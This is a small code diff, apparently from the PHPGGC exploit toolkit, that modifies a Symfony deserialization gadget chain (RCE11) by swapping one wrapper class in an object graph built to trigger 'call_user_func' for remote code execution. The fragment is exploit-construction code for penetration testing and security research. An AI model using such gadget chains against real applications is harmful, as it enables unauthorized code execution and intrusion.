@@ -15,7 +15,7 @@ class RCE11 extends \PHPGGC\GadgetChain\RCE\FunctionCall
             $parameters["parameter"]
         ]);
         $b = new \Symfony\Component\Finder\Iterator\SortableIterator($a, "call_user_func");
-        $c = new \Symfony\Component\BrowserKit\Response($b);
+        $c = new \Symfony\Component\Validator\ConstraintViolationList($b);
         $d = new \Symfony\Component\Security\Core\Authentication\Token\AnonymousToken($c);
         return $d;
     }
